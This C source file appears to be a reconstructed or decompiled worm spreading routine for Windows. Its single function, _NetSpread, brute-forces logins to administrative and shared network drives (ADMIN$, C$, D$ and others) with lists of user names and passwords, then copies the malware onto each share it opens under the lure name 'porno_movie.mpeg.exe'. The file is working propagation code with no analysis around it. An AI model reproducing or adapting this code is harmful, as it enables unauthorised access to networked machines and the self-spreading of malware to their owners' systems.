#include "data_globals.h"
#include <stdio.h>
#include <string.h>

void _NetSpread(uint32_t param_1, LPCSTR param_2)
{
    NETRESOURCEA net_inf;
    char nb_remote[MAX_PATH];
    char *share_name[] = {"SharedDocs", "ADMIN$", "C$", "D$", "E$", "C", "D"};
    DWORD ret, share_cnt, users_cnt, pwd_cnt;

    for (share_cnt = 0; share_cnt < 7; share_cnt++)
    {
        for (users_cnt = 0; users_cnt < USERS_NUM; users_cnt++)
        {
            for (pwd_cnt = 0; pwd_cnt < PWD_NUM; pwd_cnt++)
            {
                memset(nb_remote, 0, MAX_PATH);
                sprintf(nb_remote, "%s\\%s", (char *)param_1, share_name[share_cnt]);

                memset(&net_inf, 0, sizeof(net_inf));
                net_inf.dwDisplayType = RESOURCETYPE_ANY;
                net_inf.lpRemoteName = nb_remote;
                net_inf.lpLocalName = NULL;
                net_inf.lpProvider = NULL;

                ret = WNetAddConnection2A(&net_inf,
                                          passwords_list[pwd_cnt],
                                          users_list[users_cnt],
                                          0);

                if (ret == NO_ERROR)
                {
                    strcat(nb_remote, "\\porno_movie.mpeg.exe");
                    CopyFileA(param_2, nb_remote, FALSE);

                    memset(nb_remote, 0, MAX_PATH);
                    sprintf(nb_remote, "%s\\%s", (char *)param_1, share_name[share_cnt]);
                    WNetCancelConnectionA(nb_remote, TRUE);
                }
            }
        }
    }
}
